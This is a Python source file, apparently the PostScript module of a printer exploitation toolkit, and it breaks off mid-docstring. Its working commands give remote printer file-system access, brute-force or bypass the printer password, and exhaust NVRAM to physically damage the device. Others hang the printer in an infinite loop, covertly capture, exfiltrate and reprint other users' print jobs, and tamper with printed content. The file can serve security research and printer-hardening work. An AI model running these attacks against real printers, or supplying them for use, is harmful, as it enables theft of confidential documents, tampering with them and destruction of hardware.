# -*- coding: utf-8 -*-

# python standard library
import re, os, sys, string, random, json, collections

# local pret classes
from printer import printer
from operators import operators
from helper import log, output, conv, file, item, const as c

class postscript(printer):
  # --------------------------------------------------------------------
  # send PostScript command to printer, optionally receive response
  def cmd(self, str_send, fb=True, crop=True, binary=False):
    str_recv = "" # response buffer
    if self.iohack: str_send = '{' + str_send + '} stopped' # br-script workaround
    token = c.DELIMITER + str(random.randrange(2**16)) # unique response delimiter
    iohack = c.PS_IOHACK if self.iohack else ''   # optionally include output hack
    footer = '\n(' + token + '\\n) print flush\n' # additional line feed necessary
    # send command to printer device              # to get output on some printers
    try:
      cmd_send = c.UEL + c.PS_HEADER + iohack + str_send + footer # + c.UEL
      # write to logfile
      log().write(self.logfile, str_send + os.linesep)
      # sent to printer
      self.send(cmd_send)
      # use random token or error message as delimiter PS responses
      str_recv = self.recv(token + ".*$" + "|" + c.PS_FLUSH, fb, crop, binary)
      return self.ps_err(str_recv)

    # handle CTRL+C and exceptions
    except (KeyboardInterrupt, Exception) as e:
      self.reconnect(str(e))
      return ""

  # send PostScript command, cause permanent changes
  def globalcmd(self, str_send, *stuff):
    return self.cmd(c.PS_GLOBAL + str_send, *stuff)

  # send PostScript command, bypass invalid access
  def supercmd(self, str_send, *stuff):
    return self.cmd('{' + str_send + '}' + c.PS_SUPER, *stuff)

  # handle error messages from PostScript interpreter
  def ps_err(self, str_recv):
    self.error = None
    msg = item(re.findall(c.PS_ERROR, str_recv))
    if msg: # real postscript command errors
      output().errmsg("PostScript Error", msg)
      self.error = msg
      str_recv = ""
    else: # printer errors or status messages
      msg = item(re.findall(c.PS_CATCH, str_recv))
      if msg:
        self.chitchat("Status Message: '" + msg.strip() + "'")
        str_recv = re.sub(r'' + c.PS_CATCH + '\r?\n', '', str_recv)
    return str_recv

  # disable printing hard copies of error messages
  def on_connect(self, mode):
    if mode == 'init': # only for the first connection attempt
      str_send = '(x1) = (x2) ==' # = original, == overwritten
      str_send += ' << /DoPrintErrors false >> setsystemparams'
      str_recv = self.cmd(str_send)
      #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
      # handle devices that do not support ps output via 'print' or '=='
      if 'x1' in str_recv or self.error: self.iohack = False # all fine
      elif 'x2' in str_recv: # hack required to get output (e.g. brother)
        output().errmsg('Crippled feedback', '%stdout hack enabled')
      else: # busy or not a PS printer or a silent one (e.g. Dell 3110cn)
        output().errmsg('No feedback', 'Printer busy, non-ps or silent')

  # ------------------------[ shell ]-----------------------------------
  def do_shell(self, arg):
    "Open interactive PostScript shell."
    # politely request poor man's remote postscript shell
    output().info("Launching PostScript shell. Press CTRL+D to exit.")
    try:
      self.send(c.UEL + c.PS_HEADER + "false echo executive\n")
      while True:
        # use postscript prompt or error message as delimiter
        str_recv = self.recv(c.PS_PROMPT + "$|" + c.PS_FLUSH, False, False)
        # output raw response from printer
        output().raw(str_recv, "")
        # break on postscript error message
        if re.search(c.PS_FLUSH, str_recv): break
        # fetch user input and send it to postscript shell
        self.send(raw_input("") + "\n")
    # handle CTRL+C and exceptions
    except (EOFError, KeyboardInterrupt) as e:
      pass
    # reconnect with new conn object
    self.reconnect(None)

  # --------------------------------------------------------------------
  # check if remote volume exists
  def vol_exists(self, vol=''):
    if vol: vol = '%' + vol.strip('%') + '%'
    str_recv = self.cmd('/str 128 string def (*)'
             + '{print (\\n) print} str devforall')
    vols = str_recv.splitlines() + ['%*%']
    if vol: return vol in vols # return availability
    else: return vols # return list of existing vols

  # check if remote directory exists
  def dir_exists(self, path, list=[]):
    path = self.escape(path)
    if self.fuzz and not list: # use status instead of filenameforall
      return (self.file_exists(path) != c.NONEXISTENT)
    # use filenameforall as some ps interpreters do not support status
    if not list: list = self.dirlist(path, False)
    for name in list: # use dirlist to check if directory
      if re.search("^(%.*%)?" + path + c.SEP, name): return True

  # check if remote file exists
  def file_exists(self, path, ls=False):
    str_recv = self.cmd('(' + path + ') status dup '
             + '{pop == == == ==} if', False)
    meta = str_recv.splitlines()
    # standard conform ps interpreters respond with file size + timestamps
    if len(meta) == 4:
      # timestamps however are often mixed up…
      timestamps = [conv().int(meta[0]), conv().int(meta[1])]
      otime = conv().lsdate(min(timestamps)) # created (may also be ctime)
      mtime = conv().lsdate(max(timestamps)) # last referenced for writing
      size  = str(conv().int(meta[2]))       # bytes (file/directory size)
      pages = str(conv().int(meta[3]))       # pages (ain't really useful)
      return (size, otime, mtime) if ls else int(size)
    # broken interpreters return true only; can also mean: directory
    elif item(meta) == 'true': return c.FILE_EXISTS
    else: return c.NONEXISTENT

  # escape postscript pathname
  def escape(self, path):
    return path.replace('\\', '\\\\').replace('(', '\(').replace(')', '\)')

  #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
  # get complete list of files and directories on remote device
  def dirlist(self, path="", r=True):
    if r: path = self.rpath(path)
    path = self.escape(path + self.get_sep(path))
    vol = "" if self.vol else "%*%" # search any volume if none specified
    # also lists hidden .dotfiles + special treatment for brother devices
    str_recv = self.find(vol + path + "**") or self.find(vol + path + "*")
    list = {name for name in str_recv.splitlines()}
    return sorted(list)

  def find(self, path):
    str_send = '{false statusdict /setfilenameextend get exec} stopped\n'\
               '/str 256 string def (' + path + ') '\
               '{print (\\n) print} str filenameforall'
    return self.timeoutcmd(str_send, self.timeout * 2, False)

  # ------------------------[ ls <path> ]-------------------------------
  def do_ls(self, arg):
    "List contents of remote directory:  ls <path>"
    path = self.rpath(arg) + self.get_sep(arg)
    list = self.dirlist(arg)
    cwdlist = []
    # create file list without subdirs
    for name in list:
      max = len(path.split(c.SEP))
      name = c.SEP.join(name.split(c.SEP)[:max])
      # add new and non-empty filenames to list
      if not name in cwdlist and re.sub("^(%.*%)", '', name):
        cwdlist.append(name)
    # get metadata for files in cwd
    for name in cwdlist:
      isdir = self.dir_exists(name, list) # check if file is directory
      metadata = self.file_exists(name, True) if not isdir else None
      if metadata == c.FILE_EXISTS or isdir: # create dummy metadata
        (size, otime, mtime) = ('-', conv().lsdate(0), conv().lsdate(0))
      elif metadata != c.NONEXISTENT: size, otime, mtime = metadata
      if metadata != c.NONEXISTENT: # we got real or dummy metadata
        output().psdir(isdir, size, otime, self.basename(name), mtime)
      else: output().errmsg("Crippled filename", 'Bad interpreter')

  # ------------------------[ find <path> ]-----------------------------
  def do_find(self, arg):
    "Recursively list contents of directory:  find <path>"
    for name in self.dirlist(arg):
      output().psfind(name)

  # ------------------------[ mirror <path> ]---------------------------
  def do_mirror(self, arg):
    "Mirror remote file system to local directory:  mirror <remote path>"
    for name in self.dirlist(arg):
      self.mirror(name, True)

  # ====================================================================

  # ------------------------[ mkdir <path> ]----------------------------
  def do_mkdir(self, arg):
    "Create remote directory:  mkdir <path>"
    if not arg:
      arg = raw_input("Directory: ")
    # writing to dir/file should automatically create dir/
    # .dirfile is not deleted as empty dirs are not listed
    self.put(self.rpath(arg) + c.SEP + '.dirfile', '')

  # ------------------------[ get <file> ]------------------------------
  def get(self, path, size=None):
    if not size:
      size = self.file_exists(path)
    if size != c.NONEXISTENT:
      # read file, one byte at a time
      str_recv = self.cmd('/byte (0) def\n'
                        + '/infile (' + path + ') (r) file def\n'
                        + '{infile read {byte exch 0 exch put\n'
                        + '(%stdout) (w) file byte writestring}\n'
                        + '{infile closefile exit} ifelse\n'
                        + '} loop', True, True, True)
      return (size, str_recv)
    else:
      print("File not found.")
      return c.NONEXISTENT

  # ------------------------[ put <local file> ]------------------------
  def put(self, path, data, mode='w+'):
    if self.iohack: # brother devices without any writeable volumes
      output().warning("Writing will probably fail on this device")
    # convert to PostScript-compatibe octal notation
    data = ''.join(['\\{:03o}'.format(ord(char)) for char in data])
    self.cmd('/outfile (' + path + ') (' + mode + ') file def\n'
           + 'outfile (' + data + ') writestring\n'
           + 'outfile closefile\n', False)

  # ------------------------[ append <file> <string> ]------------------
  def append(self, path, data):
    self.put(path, data, 'a+')

  # ------------------------[ delete <file> ]---------------------------
  def delete(self, arg):
    path = self.rpath(arg)
    self.cmd('(' + path + ') deletefile', False)

  # ------------------------[ rename <old> <new> ]----------------------
  def do_rename(self, arg):
    arg = re.split("\s+", arg, 1)
    if len(arg) > 1:
      old = self.rpath(arg[0])
      new = self.rpath(arg[1])
      self.cmd('(' + old + ') (' + new + ') renamefile', False)
    else:
      self.onecmd("help rename")

  # define alias but do not show alias in help
  do_mv = do_rename
  def help_rename(self):
    print("Rename remote file:  rename <old> <new>")

  # ====================================================================

  # ------------------------[ id ]--------------------------------------
  def do_id(self, *arg):
    "Show device information."
    output().info(self.cmd('product print'))

  # ------------------------[ version ]---------------------------------
  def do_version(self, *arg):
    "Show PostScript interpreter version."
    str_send = '(Dialect:  ) print\n'\
      'currentpagedevice dup (PostRenderingEnhance) known {(Adobe\\n)   print}\n'\
      '{serverdict       dup (execkpdlbatch)        known {(KPDL\\n)    print}\n'\
      '{statusdict       dup (BRversion)            known {(BR-Script ) print\n'\
      '/BRversion get ==}{(Unknown) print} ifelse} ifelse} ifelse\n'\
      'currentsystemparams 11 {dup} repeat\n'\
      '                     (Version:  ) print version           ==\n'\
      '                     (Level:    ) print languagelevel     ==\n'\
      '                     (Revision: ) print revision          ==\n'\
      '                     (Serial:   ) print serialnumber      ==\n'\
      '/SerialNumber known {(Number:   ) print /SerialNumber get ==} if\n'\
      '/BuildTime    known {(Built:    ) print /BuildTime    get ==} if\n'\
      '/PrinterName  known {(Printer:  ) print /PrinterName  get ==} if\n'\
      '/LicenseID    known {(License:  ) print /LicenseID    get ==} if\n'\
      '/PrinterCode  known {(Device:   ) print /PrinterCode  get ==} if\n'\
      '/EngineCode   known {(Engine:   ) print /EngineCode   get ==} if'
    output().info(self.cmd(str_send))

  # ------------------------[ df ]--------------------------------------
  def do_df(self, arg):
    "Show volume information."
    output().df(('VOLUME', 'TOTAL SIZE', 'FREE SPACE', 'PRIORITY',
    'REMOVABLE', 'MOUNTED', 'HASNAMES', 'WRITEABLE', 'SEARCHABLE'))
    for vol in self.vol_exists():
      str_send = '(' + vol + ') devstatus dup {pop ' + '== ' * 8 + '} if'
      lst_recv = self.cmd(str_send).splitlines()
      values = (vol,) + tuple(lst_recv if len(lst_recv) == 8 else ['-'] * 8)
      output().df(values)

  # ------------------------[ free ]------------------------------------
  def do_free(self, arg):
    "Show available memory."
    #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
    output().raw("RAM status")
    output().info(self.cmd('currentsystemparams dup dup dup\n'
                         + '/mb 1048576 def /kb 100 def /str 32 string def\n'
                         + '(size:   ) print /InstalledRam known {\n'
                         + '  /InstalledRam get dup mb div cvi str cvs print (.) print kb mod cvi str cvs print (M\\n) print}{pop (Not available\\n) print\n'
                         + '} ifelse\n'
                         + '(free:   ) print /RamSize known {\n'
                         + '  /RamSize get dup mb div cvi str cvs print (.) print kb mod cvi str cvs print (M\\n) print}{pop (Not available\\n) print\n'
                         + '} ifelse'))
    #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
    output().raw("Virtual memory")
    output().info(self.cmd('vmstatus\n'
                         + '/mb 1048576 def /kb 100 def /str 32 string def\n'
                         + '(max:    ) print dup mb div cvi str cvs print (.) print kb mod cvi str cvs print (M\\n) print\n'
                         + '(used:   ) print dup mb div cvi str cvs print (.) print kb mod cvi str cvs print (M\\n) print\n'
                         + '(level:  ) print =='))
    #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
    output().raw("Font cache")
    output().info(self.cmd('cachestatus\n'
                         + '/mb 1048576 def /kb 100 def /str 32 string def\n'
                         + '(blimit: ) print ==\n'
                         + '(cmax:   ) print ==\n'
                         + '(csize:  ) print ==\n'
                         + '(mmax:   ) print ==\n'
                         + '(msize:  ) print ==\n'
                         + '(bmax:   ) print ==\n'
                         + '(bsize:  ) print =='))
    #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
    output().raw("User cache")
    output().info(self.cmd('ucachestatus\n'
                         + '/mb 1048576 def /kb 100 def /str 32 string def\n'
                         + '(blimit: ) print ==\n'
                         + '(rmax:   ) print ==\n'
                         + '(rsize:  ) print ==\n'
                         + '(bmax:   ) print ==\n'
                         + '(bsize:  ) print =='))

  # ------------------------[ devices ]---------------------------------
  def do_devices(self, arg):
    "Show available I/O devices."
    str_send = '/str 128 string def (*) {print (\\n) print} str /IODevice resourceforall'
    for dev in self.cmd(str_send).splitlines():
      output().info(dev)
      output().raw(self.cmd('(' + dev + ') currentdevparams {exch 128 string '
                          + 'cvs print (: ) print ==} forall') + os.linesep)

  # ------------------------[ uptime ]----------------------------------
  def do_uptime(self, arg):
    "Show system uptime (might be random)."
    str_recv = self.cmd('realtime ==')
    try: output().info(conv().elapsed(str_recv, 1000))
    except ValueError: output().info("Not available")

  # ------------------------[ date ]------------------------------------
  def do_date(self, arg):
    "Show printer's system date and time."
    str_send = '(%Calendar%) /IODevice resourcestatus\n'\
               '{(%Calendar%) currentdevparams /DateTime get print}\n'\
               '{(Not available) print} ifelse'
    str_recv = self.cmd(str_send)
    output().info(str_recv)

  # ------------------------[ pagecount ]-------------------------------
  def do_pagecount(self, arg):
    "Show printer's page counter:  pagecount <number>"
    output().raw("Hardware page counter: ", '')
    str_send = 'currentsystemparams dup /PageCount known\n'\
               '{/PageCount get ==}{(Not available) print} ifelse'
    output().info(self.cmd(str_send))

  # ====================================================================

  # ------------------------[ lock <passwd> ]---------------------------
  def do_lock(self, arg):
    "Set startjob and system parameters password."
    if not arg:
      arg = raw_input("Enter password: ")
    self.cmd('<< /Password () '
             '/SystemParamsPassword (' + arg + ') ' # harmless settings
             '/StartJobPassword (' + arg + ') '     # alter initial vm!
             '>> setsystemparams', False)

  # ------------------------[ unlock <passwd>|"bypass" ]----------------
  def do_unlock(self, arg):
    "Unset startjob and system parameters password."
    max = 2**20 # exhaustive key search max value
    # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
    # note that only numeric passwords can be cracked right now
    # according to the reference using 'reset' should also work:
    # **********************************************************
    # »if the system parameter password is forgotten, there is
    # still a way to reset it [...] by passing a dictionary to
    # setsystemparams in which FactoryDefaults is the only entry«
    # **********************************************************
    if not arg:
      print("No password given, cracking.") # 140k tries/sec on lj4250!
      output().chitchat("If this ain't successful, try 'unlock bypass'")
      arg = self.timeoutcmd('/min 0 def /max ' + str(max) + ' def\n'
              'statusdict begin {min 1 max\n'
              '  {dup checkpassword {== flush stop}{pop} ifelse} for\n'
              '} stopped pop', self.timeout * 100)
    # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
    # superexec can be used to reset PostScript passwords on most devices
    elif arg == 'bypass':
      print("Resetting password to zero with super-secret PostScript magic")
      self.supercmd('<< /SystemParamsPassword (0)'
      ' /StartJobPassword (0) >> setsystemparams')
      arg = '0' # assume we have successfully reset the passwords to zero
    # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
    # finally unlock device with user-supplied or cracked password
    str_recv = self.cmd('{ << /Password (' + arg + ')\n'
                        '  /SystemParamsPassword ()\n' # mostly harmless
                        '  /StartJobPassword ()\n' # permanent VM change
                        '  >> setsystemparams\n} stopped ==')
    msg = "Use the 'reset' command to restore factory defaults"
    if not 'false' in str_recv: output().errmsg("Cannot unlock", msg)
    else: output().raw("Device unlocked with password: " + arg)

  # ------------------------[ restart ]---------------------------------
  def do_restart(self, arg):
    "Restart PostScript interpreter."
    output().chitchat("Restarting PostScript interpreter.")
    # reset VM, might delete downloaded files and/or restart printer
    self.globalcmd('systemdict /quit get exec')

  # ------------------------[ reset ]-----------------------------------
  def do_reset(self, arg):
    "Reset PostScript settings to factory defaults."
    # reset system parameters -- only works if printer is turned off
    ''' »A flag that, if set to true immediately before the printer is turned
    off, causes all nonvolatile parameters to revert to their factory default
    values at the next power-on. The set of nonvolatile parameters is product
    dependent. In most products, 'PageCount' cannot be reset. If the job that
    sets FactoryDefaults to true is not the last job executed straight before
    power-off, the request is ignored; this reduces the chance that malicious
    jobs will attempt to perform this operation.« '''
    self.cmd('<< /FactoryDefaults true >> setsystemparams', False)
    output().raw("Printer must be turned off immediately for changes to take effect.")
    output().raw("This can be accomplished, using the 'restart' command in PJL mode.")

  # ------------------------[ format ]----------------------------------
  def do_format(self, arg):
    "Initialize printer's file system:  format <disk>"
    if not self.vol:
      output().info("Set volume first using 'chvol'")
    else:
      output().warning("Warning: Initializing the printer's file system will whipe-out all")
      output().warning("user data (e.g. stored jobs) on the volume. Press CTRL+C to abort.")
      if output().countdown("Initializing " + self.vol + " in...", 10, self):
        str_recv = self.cmd('statusdict begin (' + self.vol + ') () initializedisk end', False)

  # ------------------------[ disable ]---------------------------------
  def do_disable(self, arg):
    output().psonly()
    before = 'true' in self.globalcmd('userdict /showpage known dup ==\n'
                                      '{userdict /showpage undef}\n'
                                      '{/showpage {} def} ifelse')
    after = 'true' in self.cmd('userdict /showpage known ==')
    if before == after: output().info("Not available") # no change
    elif before: output().info("Printing is now enabled")
    elif after: output().info("Printing is now disabled")

  # define alias but do not show alias in help
  do_enable = do_disable
  def help_disable(self):
    print("Disable printing functionality.")

  # ------------------------[ destroy ]---------------------------------
  def do_destroy(self, arg):
    "Cause physical damage to printer's NVRAM."
    output().warning("Warning: This command tries to cause physical damage to the")
    output().warning("printer NVRAM. Use at your own risk. Press CTRL+C to abort.")
    if output().countdown("Starting NVRAM write cycle loop in...", 10, self):
      '''
      ┌───────────────────────────────────────────────────────────┐
      │               how to destroy your printer?                │
      ├───────────────────────────────────────────────────────────┤
      │ Older devices allow us to set system parameters within a  │
      │ PostScript loop. New devices only write to the NVRAM once │
      │ the print job finishes which slows down NVRAM exhaustion. │
      │ To get the best of both worlds, we use a hybrid approach. │
      ├───────────────────────────────────────────────────────────┤
      │ Note that this will only work if /WaitTimeout survives a  │
      │ reboot. Else we should use the /StartJobPassword instead. │
      └───────────────────────────────────────────────────────────┘
      '''
      cycles = '100' # number of nvram write cycles per loop
                     # large values kill old printers faster
      for n in range(1, 1000000):
        self.globalcmd('/value {currentsystemparams /WaitTimeout get} def\n'
                       '/count 0 def /new {count 2 mod 30 add} def\n'
                       '{ << /WaitTimeout new >> setsystemparams\n'
                       '  /count count 1 add def % increment\n'
                       '  value count ' + cycles + ' eq {exit} if\n'
                       '} loop', False)
        self.chitchat("\rNVRAM write cycles: " + str(n*int(cycles)), '')
      print # echo newline if we get this far

  # ------------------------[ hang ]------------------------------------
  def do_hang(self, arg):
    "Execute PostScript infinite loop."
    output().warning("Warning: This command causes an infinite loop rendering the")
    output().warning("device useless until manual restart. Press CTRL+C to abort.")
    if output().countdown("Executing PostScript infinite loop in...", 10, self):
      self.cmd('{} loop', False)

  # ====================================================================

  # ------------------------[ overlay <file> ]--------------------------
  def do_overlay(self, arg):
    "Put overlay image on all hard copies:  overlay <file>"
    if not arg: arg = raw_input('File: ')
    if arg.endswith('ps'): data = file().read(arg) # already ps/eps file
    else:
      self.chitchat("For best results use a file from the overlays/ directory")
      data = self.convert(arg, 'eps') # try to convert other file types
    if data: self.overlay(data)

  # define alias
  complete_overlay = printer.complete_lfiles # files or directories

  def overlay(self, data):
    output().psonly()
    size = conv().filesize(len(data)).strip()
    self.chitchat("Injecting overlay data (" + size + ") into printer memory")
    str_send = '{overlay closefile} stopped % free memory\n'\
               '/overlay systemdict /currentfile get exec\n'\
               + str(len(data)) + ' () /SubFileDecode filter\n'\
               '/ReusableStreamDecode filter\n' + data + '\n'\
               'def % --------------------------------------\n'\
               '/showpage {save /showpage {} def overlay dup\n'\
               '0 setfileposition cvx exec restore systemdict\n'\
               '/showpage get exec} def'
    self.globalcmd(str_send)

  # ------------------------[ cross <text> <font> ]---------------------
  def do_cross(self, arg):
    arg = re.split("\s+", arg, 1)
    if len(arg) > 1 and arg[0] in self.options_cross:
      font, text = arg
      text = text.strip('"')
      data = file().read(self.fontdir + font + ".pfa") or ""
      data += '\n/' + font + ' findfont 50 scalefont setfont\n'\
              '80 185 translate 52.6 rotate 1.1 1 scale 275 -67 moveto\n'\
              '(' + text  + ') dup stringwidth pop 2 div neg 0 rmoveto show'
      self.overlay(data)
    else:
      self.onecmd("help cross")

  def help_cross(self):
    print("Put printer graffiti on all hard copies:  cross <font> <text>")
    print("Read the docs on how to install custom fonts. Available fonts:")
    if len(self.options_cross) > 0: last = sorted(self.options_cross)[-1]
    for font in sorted(self.options_cross): print(('└─ ' if font == last else '├─ ') + font)

  fontdir = os.path.dirname(os.path.realpath(__file__))\
          + os.path.sep + 'fonts' + os.path.sep
  options_cross = [os.path.splitext(font)[0] for font in (os.listdir(fontdir)
                  if os.path.exists(fontdir) else []) if font.endswith('.pfa')]

  def complete_cross(self, text, line, begidx, endidx):
    return [cat for cat in self.options_cross if cat.startswith(text)]

  # ------------------------[ replace <old> <new> ]---------------------
  def do_replace(self, arg):
    "Replace string in documents to be printed:  replace <old> <new>"
    arg = re.split("\s+", arg, 1)
    if len(arg) > 1:
      output().psonly()
      oldstr, newstr = self.escape(arg[0]), self.escape(arg[1])
      self.globalcmd('/strcat {exch dup length 2 index length add string dup\n'
                      'dup 4 2 roll copy length 4 -1 roll putinterval} def\n'
                      '/replace {exch pop (' + newstr + ') exch 3 1 roll exch strcat strcat} def\n'
                      '/findall {{(' + oldstr + ') search {replace}{exit} ifelse} loop} def\n'
                      '/show       {      findall       systemdict /show       get exec} def\n'
                      '/ashow      {      findall       systemdict /ashow      get exec} def\n'
                      '/widthshow  {      findall       systemdict /widthshow  get exec} def\n'
                      '/awidthshow {      findall       systemdict /awidthshow get exec} def\n'
                      '/cshow      {      findall       systemdict /cshow      get exec} def\n'
                      '/kshow      {      findall       systemdict /kshow      get exec} def\n'
                      '/xshow      { exch findall exch  systemdict /xshow      get exec} def\n'
                      '/xyshow     { exch findall exch  systemdict /xyshow     get exec} def\n'
                      '/yshow      { exch findall exch  systemdict /yshow      get exec} def\n')
    else:
      self.onecmd("help replace")

  # ------------------------[ capture <operation> ]---------------------
  def do_capture(self, arg):
    "Capture further jobs to be printed on this device."
    free = '5' # memory limit in megabytes that must at least be free to capture print jobs
    # record future print jobs
    if arg.startswith('start'):
      output().psonly()
      # PRET commands themself should not be capture if they're performed within ≤ 10s idle
      '''
      ┌──────────┬───────────────────────────────┬───────────────┐
      │ hooking: │       BeginPage/EndPage       │ overwrite all │
      ├──────────┼───────────────────────────────┼───────────────┤
      │ metadat: │               ✔               │       -       │
      ├──────────┼───────────────────────────────┼───────┬───────┤
      │ globals: │   we are already global(?)    │ need  │ none  │
      ├──────────┼───────────────┬───────────────┼───────┴───────┤
      │ capture: │  currentfile  │   %lineedit   │  currentfile  │
      ├──────────┼───────┬───────┼───────┬───────┼───────┬───────┤
      │ storage: │ nfile │ vfile │ nfile │ array │ vfile │ nfile │
      ├──────────┼───────┼───────┼───────┼───────┼───────┼───────┤
      │ package: │   ✔   │   ?   │   ✔   │   ?   │   ?   │   ✔   │
      ├──────────┼───────┼───────┼───────┼───────┼───────┼───────┤
      │ execute: │   ✔   │   ✔   │   ✔   │   -   │   ✔   │   ✔   │
      └──────────┴───────┴───────┴───────┴───────┴───────┴───────┘
      '''
      str_send = 'true 0 startjob {                                                     \n'\
                 '/setoldtime {/oldtime realtime def} def setoldtime                    \n'\
                 '/threshold {realtime oldtime sub abs 10000 lt} def                    \n'\
                 '/free {vmstatus exch pop exch pop 1048576 div '+free+' ge} def        \n'\
                 '%---------------------------------------------------------------------\n'\
                 '%--------------[ get current document as file object ]----------------\n'\
                 '%---------------------------------------------------------------------\n'\
                 '/document {(%stdin) (r) file /ReusableStreamDecode filter} bind def   \n'\
                 '%---------------------------------------------------------------------\n'\
                 '/capturehook {{                                                       \n'\
                 '  threshold {(Within threshold - will not capture\\n) print flush     \n'\
                 '  setoldtime                                                          \n'\
                 '}{                                                                    \n'\
                 '  setoldtime                                                          \n'\
                 '  free not {(Out of memory\\n) print flush}{                          \n'\
                 '  % (This job will be captured in memory\\n) print flush              \n'\
                 '  setoldtime                                                          \n'\
                 '  false echo                            % stop interpreter slowdown   \n'\
                 '  /timestamp realtime def               % get time from interpreter   \n'\
                 '  userdict /capturedict known not       % print jobs are saved here   \n'\
                 '  {/capturedict 50000 dict def} if      % define capture dictionary   \n'\
                 '  %-------------------------------------------------------------------\n'\
                 '  %--------------[ save document to dict and print it ]---------------\n'\
                 '  %-------------------------------------------------------------------\n'\
                 '  capturedict timestamp document put    % store document in memory    \n'\
                 '  capturedict timestamp get cvx exec    % print the actual document   \n'\
                 '  clear cleardictstack                  % restore original vm state   \n'\
                 '  %-------------------------------------------------------------------\n'\
                 '  setoldtime                                                          \n'\
                 '  } ifelse} ifelse} stopped} bind def                                 \n'\
                 '<< /BeginPage {capturehook} bind >> setpagedevice                     \n'\
                 '(Future print jobs will be captured in memory!)}                      \n'\
                 '{(Cannot capture - unlock me first)} ifelse print'
      output().raw(self.cmd(str_send))
    #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
    # show captured print jobs
    elif arg.startswith('list'):
      # show amount of free virtual memory left to capture print jobs
      vmem = self.cmd('vmstatus exch pop exch pop 32 string cvs print')
      output().chitchat("Free virtual memory: " + conv().filesize(vmem)
        + " | Limit to capture: " + conv().filesize(int(free) * 1048576))
      output().warning(self.cmd('userdict /free known {free not\n'
        '{(Memory almost full, will not capture jobs anymore) print} if}\n'
        '{(Capturing print jobs is currently not active) print} ifelse'))
      # get first 100 lines for each captured job
      str_recv = self.cmd(
        'userdict /capturedict known {capturedict\n'
        '{ exch realtime sub (Date: ) print == dup          % get time diff\n'
        '  resetfile (Size: ) print dup bytesavailable ==   % get file size\n'
        '  100 {dup 128 string readline {(%%) anchorsearch  % get metadata\n'
        '  {exch print (\\n) print} if pop}{pop exit} ifelse} repeat pop\n'
        '  (' + c.DELIMITER + '\\n) print\n'
        '} forall clear} if')
      # grep for metadata in captured jobs
      jobs = []
      for val in filter(None, str_recv.split(c.DELIMITER)):
        date = conv().timediff(item(re.findall('Date: (.*)', val)))
        size = conv().filesize(item(re.findall('Size: (.*)', val)))
        user = item(re.findall('For: (.*)', val))
        name = item(re.findall('Title: (.*)', val))
        soft = item(re.findall('Creator: (.*)', val))
        jobs.append((date, size, user, name, soft))
      # output metadata for captured jobs
      if jobs:
        output().joblist(('date', 'size', 'user', 'jobname', 'creator'))
        output().hline(79)
        for job in jobs: output().joblist(job)
    #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
    # save captured print jobs
    elif arg.startswith('fetch'):
      jobs = self.cmd('userdict /capturedict known {capturedict {exch ==} forall} if').splitlines()
      if not jobs: output().raw("No jobs captured")
      else:
        for job in jobs:
          # is basename sufficient to sanatize file names? we'll see…
          target, job = self.basename(self.target), self.basename(job)
          root = os.path.join('capture', target)
          lpath = os.path.join(root, job + '.ps')
          self.makedirs(root)
          # download captured job
          output().raw("Receiving " + lpath)
          data = '%!\n'
          data += self.cmd('/byte (0) def\n'
            'capturedict ' + job + ' get dup resetfile\n'
            '{dup read {byte exch 0 exch put\n'
            '(%stdout) (w) file byte writestring}\n'
            '{exit} ifelse} loop')
          data = conv().nstrip(data) # remove carriage return chars
          print(str(len(data)) + " bytes received.")
          # write to local file
          if lpath and data: file().write(lpath, data)
      # be user-friendly and show some info on how to open captured jobs
      reader = 'any PostScript reader'
      if sys.platform == 'darwin': reader = 'Preview.app'       # OS X
      if sys.platform.startswith('linux'): reader = 'Evince'    # Linux
      if sys.platform in ['win32', 'cygwin']: reader = 'GSview' # Windows
      self.chitchat("Saved jobs can be opened with " + reader)
    #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
    # reprint saved print jobs
    elif arg.endswith('print'):
      output().raw(self.cmd(
       '/str 256 string def /count 0 def\n'
       '/increment {/count 1 count add def} def\n'
       '/msg {(Reprinting recorded job ) print count str\n'
       'cvs print ( of ) print total str cvs print (\\n) print} def\n'
       'userdict /capturedict known {/total capturedict length def\n'
       'capturedict {increment msg dup resetfile cvx exec} forall} if\n'
       'count 0 eq {(No jobs captured) print} if'))
    #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
    # end capturing print jobs
    elif arg.startswith('stop'):
      output().raw("Stopping job capture, deleting recorded jobs")
      self.globalcmd('<< /BeginPage {} bind /EndPage {} bind >>\n'
                     'setpagedevice userdict /capturedict undef\n')
    else:
      self.help_capture()

  def help_capture(self):
    print("Print job operations:  capture <operation>")
    print("  capture start   - Record future print jobs.")
    print("  capture stop    - End capturing print jobs.")
    print("  capture list    - Show captured print jobs.")
    print("  capture fetch   - Save captured print jobs.")
    print("  capture print   - Reprint saved print jobs.")

  options_capture = ('start', 'stop', 'list', 'fetch', 'print')
  def complete_capture(self, text, line, begidx, endidx):
    return [cat for cat in self.options_capture if cat.startswith(text)]

  # ------------------------[ hold ]------------------------------------
  def do_hold(self, arg):
    "Enable job retention."
    output().psonly()
    str_send = 'currentpagedevice (CollateDetails) get (Hold) get 1 ne\n'\
               '{/retention 1 def}{/retention 0 def} ifelse\n'\
               '<< /Collate true /CollateDetails\n'\
               '<< /Hold retention /Type 8 >> >> setpagedevice\n'\
               '(Job retention ) print\n'\
               'currentpagedevice (CollateDetails) get (Hold) get 1 ne\n'\
               '{(disabled.) print}{(enabled.) print} ifelse'
    output().info(self.globalcmd(str_send))
    self.chitchat("On most devices, jobs can only be reprinted by a local attacker via the")
    self.chitchat("printer's control panel. Stored jobs are sometimes accessible by PS/PJL")
    self.chitchat("file system access or via the embedded web server. If your printer does")
    self.chitchat("not support holding jobs try the more generic 'capture' command instead")
    #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
    '''
    **************************** HP/KYOCERA ****************************
